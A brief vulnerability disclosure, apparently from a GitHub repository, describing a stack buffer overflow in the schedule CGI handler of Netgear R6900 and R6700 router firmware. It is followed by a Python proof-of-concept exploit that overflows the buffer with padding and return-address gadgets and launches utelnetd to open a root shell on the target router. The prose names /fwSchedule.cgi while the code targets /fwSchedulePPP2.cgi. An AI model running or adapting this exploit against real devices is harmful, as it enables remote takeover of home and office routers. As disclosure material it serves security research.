# Netgear Routers vulnerability
Netgear includes three new versions of firmware, R6900 1.0.2.26, R6700v3 1.0.4.128, R6700 1.0.0.26. These versions of the firmware are vulnerable to a stack overflow as shown below.
![](https://github.com/Funcy33/Vluninfo_Repo/blob/main/CNVDs/AX12/298/vlun.png)
where sprintf v24 has only a finite size of 92 and getInputData v6, v21, v20, v19, v18 are controllable and may overflow the stack-based buffer.
By requesting the /fwSchedule.cgi page, an attacker can execute a denial-of-service attack or remote code execution using carefully crafted overflow data.
## POC
import socket
import sys

header = 'POST /fwSchedulePPP2.cgi?.css.ico/xxx/rpc/ HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.23.0\r\nContent-Length: %d\r\n\r\n'
post_data = 'action=%E5%BA%94%E7%94%A8&checkboxNameAll=checkboxValue&checkboxNamehours=checkboxValue&schedule_day=255&schedule_alldayenable=0&starthour=0&startminute=0&endhour=23&result=apply&enable_apmode=0&endminute=59:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
gadget = '%84%b7%03%00'
pad = '\x00'+'a'*(0x2d1 - len(post_data + gadget))
gadget2 = '\x48\xf5\x0c\x00'
cmd = '/bin/utelnetd -l/bin/sh -d;\x00'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1] , int(sys.argv[2])))
s.send(header % len(post_data+gadget) + post_data + gadget + pad + gadget2 + cmd)
s.close()
